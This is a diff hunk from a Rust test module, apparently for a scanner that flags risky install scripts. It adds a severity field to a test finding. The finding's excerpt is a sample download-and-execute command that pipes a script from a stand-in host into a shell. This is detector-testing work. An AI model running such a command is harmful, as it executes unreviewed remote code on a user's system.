@@ -547,6 +547,7 @@ mod tests {
             path: "demo/.INSTALL".into(),
             line: 3,
             rule: RuleId::DownloadAndExecute,
+            severity: RuleId::DownloadAndExecute.severity(),
             excerpt: "curl https://secret.example/payload?token=abc | sh".into(),
         });
         report.gaps.push(Gap::NoReviewableFiles);
